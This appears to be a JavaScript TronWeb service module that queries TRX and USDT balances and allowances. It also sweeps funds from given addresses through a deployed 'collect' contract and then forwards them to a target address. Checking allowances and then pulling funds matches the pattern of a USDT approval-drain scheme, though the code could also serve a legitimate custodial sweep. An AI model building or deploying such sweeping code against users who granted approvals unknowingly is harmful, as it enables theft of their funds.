const TronWeb = require('tronweb');

class TronService {
  constructor() {
    if (!process.env.CREATOR_PRIVATE_KEY) {
      throw new Error('CREATOR_PRIVATE_KEY环境变量未设置');
    }

    this.tronWeb = new TronWeb({
      fullHost: process.env.TRON_NETWORK === 'mainnet' 
        ? 'https://api.trongrid.io'
        : 'https://api.shasta.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': process.env.TRONGRID_API_KEY },
      privateKey: process.env.CREATOR_PRIVATE_KEY
    });

    this.USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    this.MONITOR_CONTRACT = process.env.CONTRACT_ADDRESS;
  }

  // 获取钱包余额 - 真实查询区块链
  async getWalletBalance(address) {
    try {
      if (!this.tronWeb.isAddress(address)) {
        throw new Error('无效的TRON地址');
      }

      const balance = await this.tronWeb.trx.getBalance(address);
      const usdtBalance = await this.getTokenBalance(address, this.USDT_CONTRACT);
      
      return {
        trxBalance: this.tronWeb.fromSun(balance),
        usdtBalance: usdtBalance / 1000000,
        address: address
      };
    } catch (error) {
      console.error(`获取钱包余额失败 ${address}:`, error);
      throw new Error(`获取余额失败: ${error.message}`);
    }
  }

  // 获取代币余额 - 真实查询合约
  async getTokenBalance(address, contractAddress) {
    try {
      const contract = await this.tronWeb.contract().at(contractAddress);
      const balance = await contract.balanceOf(address).call();
      return balance.toNumber();
    } catch (error) {
      console.error(`获取代币余额失败 ${address}:`, error);
      throw new Error(`获取代币余额失败: ${error.message}`);
    }
  }

  // 获取授权额度 - 真实查询合约
  async getAllowance(owner, spender) {
    try {
      const contract = await this.tronWeb.contract().at(this.USDT_CONTRACT);
      const allowance = await contract.allowance(owner, spender).call();
      return allowance.toNumber() / 1000000;
    } catch (error) {
      console.error(`获取授权额度失败 ${owner}:`, error);
      throw new Error(`获取授权额度失败: ${error.message}`);
    }
  }

  // 执行真实的归集交易
  async collectFunds(fromAddress, amount) {
    try {
      // 这里需要调用您部署的归集合约
      // 假设合约有一个collect方法
      const contract = await this.tronWeb.contract().at(this.MONITOR_CONTRACT);
      
      const transaction = await contract.collect(fromAddress).send({
        feeLimit: 100000000,
        callValue: 0,
        shouldPollResponse: true
      });

      console.log(`归集交易已发送: ${transaction.transaction.txID}`);
      return transaction;
    } catch (error) {
      console.error(`归集交易失败 ${fromAddress}:`, error);
      throw new Error(`归集失败: ${error.message}`);
    }
  }

  // 从合约划转到目标地址 - 真实交易
  async transferToTarget(amount) {
    try {
      const contract = await this.tronWeb.contract().at(this.MONITOR_CONTRACT);
      
      // 假设合约有一个transferToTarget方法
      const transaction = await contract.transferToTarget().send({
        feeLimit: 100000000,
        callValue: 0,
        shouldPollResponse: true
      });

      console.log(`合约划转交易已发送: ${transaction.transaction.txID}`);
      return transaction;
    } catch (error) {
      console.error(`合约划转失败:`, error);
      throw new Error(`合约划转失败: ${error.message}`);
    }
  }

  // 获取交易详情 - 真实查询区块链
  async getTransactionInfo(txHash) {
    try {
      const transaction = await this.tronWeb.trx.getTransaction(txHash);
      const info = await this.tronWeb.trx.getTransactionInfo(txHash);
      
      return {
        ...transaction,
        ...info
      };
    } catch (error) {
      console.error(`获取交易详情失败 ${txHash}:`, error);
      throw new Error(`获取交易详情失败: ${error.message}`);
    }
  }

  // 获取账户资源 - 真实查询
  async getAccountResources(address) {
    try {
      const account = await this.tronWeb.trx.getAccountResources(address);
      return account;
    } catch (error) {
      console.error(`获取账户资源失败 ${address}:`, error);
      throw new Error(`获取账户资源失败: ${error.message}`);
    }
  }

  // 验证地址格式
  isValidAddress(address) {
    return this.tronWeb.isAddress(address);
  }
}

module.exports = new TronService();